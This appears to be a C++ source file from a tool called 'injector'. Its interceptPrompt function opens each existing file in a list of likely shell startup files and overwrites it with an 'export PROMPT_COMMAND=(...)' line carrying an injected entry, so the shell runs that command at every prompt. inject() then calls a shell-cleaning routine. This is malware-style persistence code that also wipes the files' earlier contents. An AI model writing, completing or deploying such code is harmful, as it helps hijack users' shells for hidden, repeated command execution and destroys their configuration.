//
// Created by ferdinand on 8/12/25.
//

#include "injector.h"

#include "shells-cleaner.h"

void interceptPrompt() {
    char c;
    auto& target = replicatedEntries.back();
    for (const auto& targetFile : possibleTargetFiles) {

        std::ifstream probe(targetFile);
        if (!probe.is_open()) continue;

        std::ofstream writer(targetFile);

        writer << '\n';
        writer << "export PROMPT_COMMAND=( \"" << target << "\" )";
    }
}

void inject() {
    interceptPrompt();
    cleanShells();
}
